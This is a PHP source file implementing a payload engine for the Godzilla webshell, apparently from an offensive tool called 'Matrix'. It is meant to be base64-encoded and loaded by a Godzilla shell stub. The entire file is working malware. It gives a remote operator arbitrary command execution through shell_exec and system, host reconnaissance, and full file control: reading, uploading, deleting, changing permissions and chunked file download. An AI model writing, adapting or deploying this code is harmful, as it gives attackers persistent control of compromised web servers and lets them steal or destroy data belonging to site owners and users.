<?php
/*
 * Matrix-owned Godzilla PHP payload engine.
 *
 * This file is the *engine*, not the shell stub. It is base64-encoded into
 * data/godzilla/matrix_godzilla.php.b64 and seeded into a standard Godzilla
 * PHP shell (the stub decrypts it and stores it in $_SESSION['payload']).
 *
 * Contract (same methodName API as Godzilla's own engine, so the Matrix
 * connector works with either engine):
 *   getBasicsInfo, execCommand, getFile, readFileContent, uploadFile,
 *   newFile, newDir, deleteFile, copyFile, moveFile,
 *   bigFileDownload, bigFileUpload, setFileAttr, test.
 */

function mx_params_parse($pms)
{
    $out = array();
    $i = 0;
    $len = strlen($pms);
    $key = '';
    while ($i < $len) {
        $c = $pms[$i];
        if (ord($c) === 2) {
            if ($i + 5 > $len) {
                break;
            }
            $unpacked = unpack('V', substr($pms, $i + 1, 4));
            $n = $unpacked[1];
            $i += 5;
            if ($n < 0 || $i + $n > $len) {
                break;
            }
            $out[$key] = substr($pms, $i, $n);
            $key = '';
            $i += $n;
        } else {
            $key .= $c;
            $i++;
        }
    }
    return $out;
}

function mx_get($key)
{
    global $mx_params;
    return isset($mx_params[$key]) ? $mx_params[$key] : null;
}

function mx_s($v)
{
    return $v === null ? '' : $v;
}

function mx_basics_info()
{
    $user = @get_current_user();
    if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
        $pw = @posix_getpwuid(@posix_geteuid());
        if (is_array($pw) && isset($pw['name'])) {
            $user = $pw['name'];
        }
    }
    $roots = '';
    if (DIRECTORY_SEPARATOR === '\\') {
        foreach (range('C', 'Z') as $d) {
            if (@is_dir($d . ':/')) {
                $roots .= $d . ':/;';
            }
        }
    } else {
        $roots = '/';
    }
    // Godzilla 官方引擎同样用 SCRIPT_FILENAME 推导脚本目录；找不到时退回 getcwd()。
    $scriptDir = '';
    if (isset($_SERVER['SCRIPT_FILENAME']) && $_SERVER['SCRIPT_FILENAME'] !== '') {
        $scriptDir = @dirname($_SERVER['SCRIPT_FILENAME']);
    }
    if ($scriptDir === '' || $scriptDir === '.') {
        $scriptDir = @getcwd();
    }
    $lines = array(
        'OsInfo' => @php_uname(),
        'CurrentUser' => $user === null ? 'NULL' : $user,
        'CurrentDir' => str_replace('\\', '/', $scriptDir),
        'FileRoot' => $roots,
        'ProcessArch' => PHP_INT_SIZE === 8 ? '64' : '32',
        'TempDirectory' => @sys_get_temp_dir(),
        'PHP_VERSION' => PHP_VERSION,
        'PHP_SAPI' => PHP_SAPI,
        'disable_functions' => @ini_get('disable_functions'),
        'loaded_extensions' => implode(',', @get_loaded_extensions()),
        'memory_limit' => @ini_get('memory_limit'),
        'max_execution_time' => @ini_get('max_execution_time'),
        'safe_mode' => @ini_get('safe_mode'),
        'SERVER_ADDR' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '',
        'SERVER_NAME' => isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '',
        'SERVER_SOFTWARE' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '',
        'DOCUMENT_ROOT' => isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '',
    );
    $out = '';
    foreach ($lines as $k => $v) {
        $out .= $k . ' : ' . $v . "\n";
    }
    return $out;
}

function mx_exec($cmd)
{
    if ($cmd === null || $cmd === '') {
        return 'no command';
    }
    $out = @shell_exec($cmd . ' 2>&1');
    if ($out === null) {
        @ob_start();
        @system($cmd . ' 2>&1');
        $out = @ob_get_clean();
    }
    return $out === null ? '' : $out;
}

function mx_file_type($path)
{
    return @is_file($path) ? '1' : '0';
}

function mx_perms($path)
{
    $r = (@is_readable($path) ? 'R' : '') .
        (@is_writable($path) ? 'W' : '') .
        (@is_executable($path) ? 'X' : '');
    return $r === '' ? 'F' : $r;
}

function mx_get_file($dir)
{
    if ($dir === null || trim($dir) === '') {
        $dir = @getcwd();
    }
    $dir = str_replace('\\', '/', $dir);
    if (!@is_dir($dir)) {
        return 'Path Not Found Or No Permission!';
    }
    $path = rtrim($dir, '/') . '/';
    $out = 'ok' . "\n" . $path . "\n";
    $files = @scandir($path);
    if ($files === false) {
        return 'Path Not Found Or No Permission!';
    }
    foreach ($files as $name) {
        if ($name === '.' || $name === '..') {
            continue;
        }
        $full = $path . $name;
        $out .= $name . "\t" . mx_file_type($full) . "\t" .
            date('Y-m-d H:i:s', @filemtime($full)) . "\t" .
            (@is_file($full) ? @filesize($full) : 0) . "\t" .
            mx_perms($full) . "\n";
    }
    return $out;
}

function mx_read_file($path)
{
    if ($path === null || !@is_file($path)) {
        return 'File Not Found';
    }
    $data = @file_get_contents($path);
    return $data === false ? 'No Permission!' : $data;
}

function mx_upload_file($path, $value)
{
    if ($path === null) {
        return 'fail';
    }
    $ok = @file_put_contents($path, $value === null ? '' : $value);
    return $ok === false ? 'fail' : 'ok';
}

function mx_new_file($path)
{
    if ($path === null) {
        return 'fail';
    }
    $f = @fopen($path, 'x');
    if ($f === false) {
        return @file_exists($path) ? 'ok' : 'fail';
    }
    @fclose($f);
    return 'ok';
}

function mx_new_dir($path)
{
    if ($path === null) {
        return 'fail';
    }
    return @mkdir($path, 0777, true) ? 'ok' : (@is_dir($path) ? 'ok' : 'fail');
}

function mx_delete_path($path)
{
    if ($path === null || !@file_exists($path)) {
        return 'fail';
    }
    if (@is_dir($path) && !@is_link($path)) {
        $items = @scandir($path);
        if ($items !== false) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') {
                    continue;
                }
                mx_delete_path($path . DIRECTORY_SEPARATOR . $item);
            }
        }
        return @rmdir($path) ? 'ok' : 'fail';
    }
    return @unlink($path) ? 'ok' : 'fail';
}

function mx_copy_file($src, $dst)
{
    if ($src === null || $dst === null) {
        return 'fail';
    }
    return @copy($src, $dst) ? 'ok' : 'fail';
}

function mx_move_file($src, $dst)
{
    if ($src === null || $dst === null) {
        return 'fail';
    }
    return @rename($src, $dst) ? 'ok' : 'fail';
}

function mx_set_attr($path, $attr)
{
    if ($path === null || $attr === null) {
        return 'fail';
    }
    $mode = @octdec($attr);
    return @chmod($path, $mode) ? 'ok' : 'fail';
}

function mx_big_download($path, $mode, $position, $num)
{
    if ($path === null || !@is_file($path)) {
        return 'File Not Found';
    }
    if ($mode === 'fileSize') {
        return (string)@filesize($path);
    }
    if ($mode !== 'read') {
        return 'no mode';
    }
    $pos = $position === null ? 0 : intval($position);
    $n = $num === null ? 1048576 : intval($num);
    $f = @fopen($path, 'rb');
    if ($f === false) {
        return 'No Permission!';
    }
    @fseek($f, $pos);
    $data = @fread($f, $n);
    @fclose($f);
    return $data === false ? '' : $data;
}

function mx_big_upload($path, $contents, $position)
{
    if ($path === null) {
        return 'fail';
    }
    $data = $contents === null ? '' : $contents;
    if ($position === null || $position === '') {
        return @file_put_contents($path, $data) === false ? 'fail' : 'ok';
    }
    $f = @fopen($path, 'r+b');
    if ($f === false) {
        $f = @fopen($path, 'wb');
    }
    if ($f === false) {
        return 'fail';
    }
    @fseek($f, intval($position));
    @fwrite($f, $data);
    @fflush($f);
    @fclose($f);
    return 'ok';
}

function mx_dispatch($method)
{
    switch ($method) {
        case 'getBasicsInfo':
            return mx_basics_info();
        case 'execCommand':
            return mx_exec(mx_get('cmdLine'));
        case 'getFile':
            return mx_get_file(mx_get('dirName'));
        case 'readFileContent':
            return mx_read_file(mx_get('fileName'));
        case 'uploadFile':
            return mx_upload_file(mx_get('fileName'), mx_get('fileValue'));
        case 'newFile':
            return mx_new_file(mx_get('fileName'));
        case 'newDir':
            return mx_new_dir(mx_get('dirName'));
        case 'deleteFile':
            return mx_delete_path(mx_get('fileName'));
        case 'copyFile':
            return mx_copy_file(mx_get('srcFileName'), mx_get('destFileName'));
        case 'moveFile':
            return mx_move_file(mx_get('srcFileName'), mx_get('destFileName'));
        case 'setFileAttr':
            return mx_set_attr(mx_get('fileName'), mx_get('attr'));
        case 'bigFileDownload':
            return mx_big_download(
                mx_get('fileName'),
                mx_get('mode'),
                mx_get('position'),
                mx_get('readByteNum')
            );
        case 'bigFileUpload':
            return mx_big_upload(
                mx_get('fileName'),
                mx_get('fileContents'),
                mx_get('position')
            );
        case 'test':
            return 'ok';
        default:
            return 'unknown method: ' . mx_s($method);
    }
}

function run($pms)
{
    global $mx_params;
    try {
        if (function_exists('gzdecode') &&
            strlen($pms) >= 2 &&
            substr($pms, 0, 2) === "\x1f\x8b") {
            $decoded = @gzdecode($pms);
            if ($decoded !== false) {
                $pms = $decoded;
            }
        }
        $mx_params = mx_params_parse($pms);
        $method = mx_get('methodName');
        $result = mx_dispatch($method);
        if (!is_string($result)) {
            $result = (string)$result;
        }
        if (function_exists('gzencode')) {
            $gz = @gzencode($result, 6);
            if ($gz !== false) {
                $result = $gz;
            }
        }
        return $result;
    } catch (Throwable $e) {
        return 'Exception: ' . $e->getMessage();
    }
}
